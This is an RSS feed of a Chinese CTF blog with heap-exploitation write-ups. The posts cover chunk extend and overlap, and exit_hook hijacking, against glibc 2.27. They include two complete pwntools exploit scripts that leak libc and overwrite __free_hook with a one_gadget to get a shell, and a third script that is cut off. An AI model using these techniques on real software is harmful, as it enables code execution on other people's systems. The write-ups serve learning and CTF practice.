<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>feichai&#39;s Blog</title>
    <link>http://example.com/</link>
    
    <atom:link href="http://example.com/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>柴柴就是世界第一可爱！！!</description>
    <pubDate>Sun, 28 Jul 2024 12:34:26 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>chunk extend and overlapping</title>
      <link>http://example.com/2024/07/28/chunk-extend-overlapping/</link>
      <guid>http://example.com/2024/07/28/chunk-extend-overlapping/</guid>
      <pubDate>Sun, 28 Jul 2024 08:03:46 GMT</pubDate>
      
      <description>&lt;p&gt;堆扩展之向上重叠与向下重叠&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>堆扩展之向上重叠与向下重叠</p><span id="more"></span><h3 id="向上重叠"><a href="#向上重叠" class="headerlink" title="向上重叠"></a>向上重叠</h3><h4 id="巅峰极客-2022-smallcontainer"><a href="#巅峰极客-2022-smallcontainer" class="headerlink" title="[巅峰极客 2022]smallcontainer"></a>[巅峰极客 2022]smallcontainer</h4><p>版本是glibc2.27，对size的检查并不严谨</p><p>通过check函数造成的off by null 实现 chunk extend 和 chunk overlap</p><p>伪造堆块的prev_size域，进行chunk extend</p><p>切割unsortbin，进行chunk overlap</p><h4 id="学到的点："><a href="#学到的点：" class="headerlink" title="学到的点："></a>学到的点：</h4><p>check将\x11变为\x00时会导致chunk的大小变小，需要在chunk尾部布置堆块</p><p>free的chunk进入unsortbin时会先检查prev_size域，如果prev_size不为空，就会将本chunk的地址减掉prev_size，得到前一个chunk的首地址，并检查其是否被释放，如下图(第一个chunk是tcache，不算入，chunk编号从0开始)</p><p>free+900处，会检查前一个chunk是否被释放，方式是检查其大小与其下一个chunk的prev_size域是否相等，在此处，我是直接释放了伪造的chunk3，没有对其前一个chunk0进行释放，所以这里会跳转到free+2120报错</p><p><img src="/imgs/$%7Bfiilename%7D/chunk-extend-and-overlapping-1.png"></p><p><img src="/imgs/$%7Bfiilename%7D/chunk-extend-and-overlapping-2.png"></p><p>在对伪造堆块的前一个chunk进行伪造伪造时，我试过对chunk0和chunk1进行释放，chunk0可以，chunk1却不行，因为不太清楚unsortbin的检查机制，所以就调试了一下，为什么chunk1会不行</p><p>这里对chunk1的下一个chunk(chunk2)进行inuse的检查，因为chunk2是freed的状态，就会进行下一步检查</p><p><img src="/imgs/$%7Bfiilename%7D/chunk-extend-and-overlapping-3.png"></p><p>检查chunk3的prev_size域，此时chunk3是我们伪造的堆块，其prev_size域大小是0x600，而chunk2是0x200</p><p><img src="/imgs/$%7Bfiilename%7D/chunk-extend-and-overlapping-4.png"></p><p>所以会报错</p><p><img src="/imgs/$%7Bfiilename%7D/chunk-extend-and-overlapping-5.png"></p><p>然后chunk0前后的chunk都是used状态，所以就不会有这些额外的检查，所以总结的一点就是在这种情况下尽量布置堆块前后都没被释放，会避免很多麻烦</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>最后用one_gadget和system都是可以的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p8,p16,p32,p64,u32,u64</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">local_file = <span class="string">&#x27;/home/feichai/ctf_file/service&#x27;</span></span><br><span class="line">elf=ELF(local_file)</span><br><span class="line">local_libc = elf.libc.path</span><br><span class="line">libc=ELF(local_libc, checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        b *$rebase(0x1531)</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        io = process(local_file)</span><br><span class="line">        gdb.attach(io, gdbscript)</span><br><span class="line">    <span class="keyword">elif</span> args.PROCESS:</span><br><span class="line">        io = process(local_file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28421</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;size: &#x27;</span>,<span class="built_in">str</span>(size)) <span class="comment">#0x100 ~ 0x400</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    s(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit_</span>():</span><br><span class="line">    choice(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>): <span class="comment"># 0-2</span></span><br><span class="line">        add(<span class="number">0x1f8</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x208</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 4-10</span></span><br><span class="line">        add(<span class="number">0x1f8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 4-10</span></span><br><span class="line">        free(i+<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1f0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x11</span>))</span><br><span class="line">    edit(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1f8</span>) <span class="comment"># off by null</span></span><br><span class="line">    edit(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1f0</span> + p64(<span class="number">0x600</span>)) <span class="comment"># chunk overlap</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x200</span>) <span class="comment"># 0</span></span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0x3ec190</span></span><br><span class="line">    lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x200</span>) <span class="comment"># 3</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x211</span>)+p64(free_hook))</span><br><span class="line">    add(<span class="number">0x200</span>) <span class="comment"># 0</span></span><br><span class="line">    add(<span class="number">0x200</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">    og = [<span class="number">0x4f29e</span>, <span class="number">0x4f2a5</span>, <span class="number">0x4f302</span>, <span class="number">0x10a2fc</span>]</span><br><span class="line">    og = og[<span class="number">2</span>] + libc_base</span><br><span class="line">    edit(<span class="number">3</span>,p64(og))</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># edit(3,p64(system_addr))</span></span><br><span class="line">    <span class="comment"># edit(2,b&#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line">    <span class="comment"># free(2)</span></span><br><span class="line"></span><br><span class="line">    io.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><h3 id="向下重叠"><a href="#向下重叠" class="headerlink" title="向下重叠"></a>向下重叠</h3><h4 id="巅峰极客-2022-Gift"><a href="#巅峰极客-2022-Gift" class="headerlink" title="[巅峰极客 2022]Gift"></a>[巅峰极客 2022]Gift</h4><p>漏洞点是uaf和bargain可以输入负数从而修改heap地址</p><p>先在第一个堆块中伪造一个fack chunk，要大于0x408 (tcache的最大值)</p><p>前面加上0xb0是因为使后面在分割unsortbin的时候能够修改到 fd 指针 (这点不是很重要，不加的话就知道为什么了)</p><p>重点是伪造堆块的过程</p><h4 id="伪造堆块"><a href="#伪造堆块" class="headerlink" title="伪造堆块"></a>伪造堆块</h4><p>首先，在第一个chunk中伪造一个0x421的fack chunk</p><p>然后看fack chunk的位置，通过bargain函数将fd指针修改到这</p><p>0x330-0x260 &#x3D; 0xd0  这里要注意tcache存的地址不包括chunk头</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xb0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>)) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">1</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">1</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">bargain(<span class="number">2</span>, -<span class="number">0xd0</span>)</span><br></pre></td></tr></table></figure><p><img src="/imgs/$%7Bfiilename%7D/chunk-extend-and-overlapping-6.png"></p><p>然后就是看fack chunk在哪里结束 0x320 + 0x420 &#x3D; 0x740</p><p>所以我们就需要再申请几个堆块，直到能在0x740这个位置布置堆块</p><p>可以看到申请到chunk6时就可以在0x740中写入另一个fack chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">1</span>) <span class="comment"># 4  fack</span></span><br><span class="line">add(<span class="number">1</span>) <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)) <span class="comment"># 6</span></span><br></pre></td></tr></table></figure><p><img src="/imgs/$%7Bfiilename%7D/chunk-extend-and-overlapping-7.png"></p><p>伪造后堆块布局如下，这样我们释放fack chunk的时候就能够绕过检查了</p><p><img src="/imgs/$%7Bfiilename%7D/chunk-extend-and-overlapping-8.png"></p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><p>释放后fack chunk进入unsortbin泄露地址，选择malloc(0x60)可以切割unsortbin，然后正常的劫持free_hook为one_gadget即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p8,p16,p32,p64,u32,u64</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">local_file = <span class="string">&#x27;/home/feichai/ctf_file/service2&#x27;</span></span><br><span class="line">elf=ELF(local_file)</span><br><span class="line">local_libc = elf.libc.path</span><br><span class="line">libc=ELF(local_libc, checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        b *$rebase(0x001234)</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        io = process(local_file)</span><br><span class="line">        gdb.attach(io, gdbscript)</span><br><span class="line">    <span class="keyword">elif</span> args.PROCESS:</span><br><span class="line">        io = process(local_file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28814</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_leak</span>(<span class="params"><span class="built_in">bytes</span>=<span class="number">6</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">bytes</span> == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> u32(r(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> u64(r(<span class="built_in">bytes</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a, drop=<span class="literal">True</span>)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">&#x27;your choice:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">choose, content=<span class="string">b&#x27;aaaa&#x27;</span></span>):  <span class="comment"># &lt; 10</span></span><br><span class="line">    choice(<span class="number">2</span>) </span><br><span class="line">    sla(<span class="string">&#x27;your choice:&#x27;</span>,<span class="built_in">str</span>(choose)) <span class="comment"># 1:0x100 2:0x60</span></span><br><span class="line">    sa(<span class="string">&#x27;your gift!&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index?&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index?&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bargain</span>(<span class="params">idx, num</span>):</span><br><span class="line">    choice(<span class="number">5</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index?&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&#x27;How much?&#x27;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"></span><br><span class="line">    add(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xb0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>)) <span class="comment"># 0</span></span><br><span class="line">    add(<span class="number">1</span>) <span class="comment"># 1</span></span><br><span class="line">    add(<span class="number">1</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    bargain(<span class="number">2</span>, -<span class="number">0xd0</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">1</span>) <span class="comment"># 3</span></span><br><span class="line">    add(<span class="number">1</span>) <span class="comment"># 4  fack</span></span><br><span class="line">    add(<span class="number">1</span>) <span class="comment"># 5</span></span><br><span class="line">    add(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)) <span class="comment"># 6</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    show(<span class="number">4</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;cost: &#x27;</span>)</span><br><span class="line">    libc_base = <span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>),<span class="number">10</span>) - <span class="number">0x3ebca0</span></span><br><span class="line">    lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">2</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span> + p64(free_hook-<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">    og = [<span class="number">0x4f29e</span>, <span class="number">0x4f2a5</span>, <span class="number">0x4f302</span>, <span class="number">0x10a2fc</span>]</span><br><span class="line">    og = og[<span class="number">2</span>] + libc_base</span><br><span class="line">    add(<span class="number">1</span>) <span class="comment"># 7</span></span><br><span class="line">    add(<span class="number">1</span>,p64(og)) <span class="comment"># 8</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line">    io.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      <category domain="http://example.com/tags/uaf/">uaf</category>
      
      <category domain="http://example.com/tags/chunk-extend/">chunk extend</category>
      
      <category domain="http://example.com/tags/chunk-overlapping/">chunk overlapping</category>
      
      
      <comments>http://example.com/2024/07/28/chunk-extend-overlapping/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>exit_hook劫持</title>
      <link>http://example.com/2024/07/26/exit-hook%E5%8A%AB%E6%8C%81/</link>
      <guid>http://example.com/2024/07/26/exit-hook%E5%8A%AB%E6%8C%81/</guid>
      <pubDate>Fri, 26 Jul 2024 09:02:34 GMT</pubDate>
      
      <description>&lt;p&gt;关于申请大于top chunk的堆块使其分配到libc的地址以及exit_hook的劫持&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>关于申请大于top chunk的堆块使其分配到libc的地址以及exit_hook的劫持</p><span id="more"></span><p>例题是 [CISCN 2022 初赛]newest_note</p><p>通过申请0x20004200大小的page，乘以8后为0x100021000，因为malloc的参数是int类型，故1被截断，0x21000比top chunk大，会在libc上分配一块新地址，从而利用整形溢出可泄露libc地址</p><p><img src="/imgs/$%7Bfiilename%7D/exit_hook%E5%8A%AB%E6%8C%81-1-17219872698651.png"></p><p>通过search命令可以找到libc中保存top chunk地址的地址</p><p><img src="/imgs/$%7Bfiilename%7D/exit_hook%E5%8A%AB%E6%8C%81-2.png"></p><p>再看我们堆块的地址，即可算出偏移 (0x7fe7a2f45ce0 - 0x7fe7a2d08010) &#x2F; 8 &#x3D; 293786</p><p>用0x7fe7a2f45ce0 泄露出的地址是0x7fe7a2f45cc0，因为程序show函数内是采用的是双指针类型</p><p>0x7fe7a2f45ce0 -&gt; 0x7fe7a2f45cd0 -&gt; 0x7fe7a2f45cc0</p><p><img src="/imgs/$%7Bfiilename%7D/exit_hook%E5%8A%AB%E6%8C%81-3.png"></p><p>uaf部分就不讲了，主要记录一下exit_hook是如何劫持的</p><p>这里主要是通过调试得出来的偏移</p><p>先在exit下个断点，然后单步调试到这里</p><p><img src="/imgs/$%7Bfiilename%7D/exit_hook%E5%8A%AB%E6%8C%81-4.png"></p><p>在libc文件中呈现为</p><p><img src="/imgs/$%7Bfiilename%7D/exit_hook%E5%8A%AB%E6%8C%81-5.png"></p><p>把偏移为0x21a6c8的地址赋值给rbx，偏移0x21a6D0的地址赋值给r12，这里rbx &lt; r12，所以会执行call qword ptr [rbx]，所以只需将 0x21a6c8 的值赋为 one_gadget 就可以了</p><p>这里需要注意的是，exit_hook的偏移不能直接用 0x21a6c8，要用 0x21a6c0，不然在申请堆块时会报错</p><p>malloc(): unaligned tcache chunk detected（检测到未对齐的tache块）</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 